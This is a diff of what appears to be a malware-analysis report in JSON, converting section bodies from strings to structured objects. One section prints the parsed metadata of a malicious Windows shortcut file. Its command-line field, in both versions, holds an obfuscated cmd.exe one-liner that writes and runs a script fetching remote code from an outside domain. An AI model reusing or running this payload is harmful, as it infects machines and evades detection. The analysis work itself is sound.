@@ -5,7 +5,19 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [4.1179412481544455, 5.425857438695348]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              4.1179412481544455,
+              5.425857438695348
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +30,16 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, WorkingDir, CommandArgs, NoLinkInfo\", \"file_attributes\": \"Archive\", \"icon_index\": \"(none)\", \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"wINdOws\\\\sYSteM32\\\\Cmd.EXe\", \"working_directory\": \"C:\\\\wINdOws\\\\sYSteM32\", \"command_line_arguments\": \"/V/D/c \\\"md C:\\\\BT59TX5\\\\&&s^eT YXVE=C:\\\\BT59TX5\\\\^BT59TX5&&S^Et DNRL=voX3ar C66d=\\\"sc\\\"+\\\"^r\\\";D66d=\\\"i^p\\\"+\\\"t^:oX3h\\\";E66d=\\\"T\\\"+\\\"t^P\\\"+\\\":\\\";GoX3et^Ob^joX3ec^t(C66d+D66d+E66d+'&&s^ET 0TN=DOYWVDOYWVn7eo5j.realidadeavancada.coDOYWV?1DOYWV');&&s^Et/^p K1J0=\\\"!DNRL:oX3=!!0TN:DOYWV=/!\\\"<n^ul > !YXVE!.^jS|ca^ll c^a^ll  !YXVE!.jS\\\" \"}",
+        "body": {
+          "command_line_arguments": "/V/D/c \"md C:\\BT59TX5\\&&s^eT YXVE=C:\\BT59TX5\\^BT59TX5&&S^Et DNRL=voX3ar C66d=\"sc\"+\"^r\";D66d=\"i^p\"+\"t^:oX3h\";E66d=\"T\"+\"t^P\"+\":\";GoX3et^Ob^joX3ec^t(C66d+D66d+E66d+'&&s^ET 0TN=DOYWVDOYWVn7eo5j.realidadeavancada.coDOYWV?1DOYWV');&&s^Et/^p K1J0=\"!DNRL:oX3=!!0TN:DOYWV=/!\"<n^ul > !YXVE!.^jS|ca^ll c^a^ll  !YXVE!.jS\" ",
+          "file_attributes": "Archive",
+          "flags": "IDList, WorkingDir, CommandArgs, NoLinkInfo",
+          "hot_key": "(none)",
+          "icon_index": "(none)",
+          "run_window": "Show Minimized No Activate",
+          "target_file_dosname": "wINdOws\\sYSteM32\\Cmd.EXe",
+          "working_directory": "C:\\wINdOws\\sYSteM32"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -57,7 +78,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"target_file_dosname\": \"wINdOws\\\\sYSteM32\\\\Cmd.EXe\"}",
+        "body": {
+          "target_file_dosname": "wINdOws\\sYSteM32\\Cmd.EXe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
